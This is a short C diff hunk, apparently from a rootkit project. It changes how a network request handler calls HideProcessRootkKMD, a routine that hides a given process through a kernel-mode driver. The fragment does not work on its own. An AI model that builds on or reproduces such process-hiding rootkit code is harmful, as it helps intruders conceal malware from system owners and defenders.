@@ -377,7 +377,7 @@ int ReqAct(NETWORK_INFO Sender, NETWORK_INFO Server) {
                                 break;
                             }
 
-                            ProcessOprSuccess = HideProcessRootkKMD((char*)MdlName, RemoveProcessId, RemoveIndex, Sender.AsoSock, ProcessHideReq);
+                            ProcessOprSuccess = HideProcessRootkKMD((char*)MdlName, TRUE, RemoveProcessId, RemoveIndex, Sender.AsoSock, ProcessHideReq);
                             if (ProcessOprSuccess) {
                                 printf("Processes manipulation succeeded!\n");
                             }
